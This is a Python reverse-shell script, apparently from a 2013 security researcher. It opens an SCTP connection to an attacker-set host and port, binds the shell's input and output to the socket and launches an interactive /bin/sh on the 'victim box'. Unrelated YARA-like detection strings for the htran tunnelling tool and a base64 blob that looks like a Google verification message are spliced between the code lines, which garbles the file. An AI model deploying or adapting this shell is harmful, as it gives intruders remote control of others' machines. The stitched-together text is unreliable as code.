#!/usr/bin/python
# SCTP Reverse Shell (TCP mode)
# Requires pysctp and sctp to be working
# on the victim box.
# My perfect saturday... Involves #
# infodox - Insecurety Research 2013
# insecurety.net | @info_dox

# I probably imported too much things. Who cares.
import socket
import _sctp
import sctp
from sctp import *
import os
import subprocess
$s0 = "%s -<listen|tran|slave> <option> [-log logfile]" fullword ascii

host = '127.0.0.1' # CHANGEME
port = 1337 # CHANGEME
$s2 = "\\Release\\htran.pdb" ascii

socket.setdefaulttimeout(60)
s = None
try:
    s = sctpsocket_tcp(socket.AF_INET)
    s.connect((host,port))
    s.send('g0tsh3ll!\n')
    save = [ os.dup(i) for i in range(0,3) ]
$s3 = "[SERVER]connection to %s:%d error" fullword ascii
    os.dup2(s.fileno(),0)
WW91ciBHb29nbGUgdmVyaWZpY2F0aW9uIGNvZGUgaXM6NTY3ODQyOQpodHRwOi8vZ21haWwuY29tLz96PUZFY0NBQT09Jmk9TVRwa
FlXeGhZVzR1ZEhZNk5EUXpMREU2YldGdWIzSmhiMjVzYVc1bExtNWxkRG8wTkRNPSZzPXpwdnpQU1lTNjc0PQ==
    os.dup2(s.fileno(),1)
$s11 = "-slave  <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii
    os.dup2(s.fileno(),2)
    shell = subprocess.call(["/bin/sh","-i"])
$s4 = "-tran  <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii

    [ os.dup2(save[i],i) for i in range(0,3)]
    [ os.close(save[i]) for i in range(0,3)]
$s15 = "[+] OK! I Closed The Two Socket." fullword ascii
    os.close(s.fileno())
$s8 = "======================== htran V%s =======================" fullword ascii

except Exception:

$s20 = "-listen <ConnectPort> <TransmitPort>" fullword ascii
    print "Connection Failed! Is there even a listener?"
    pass
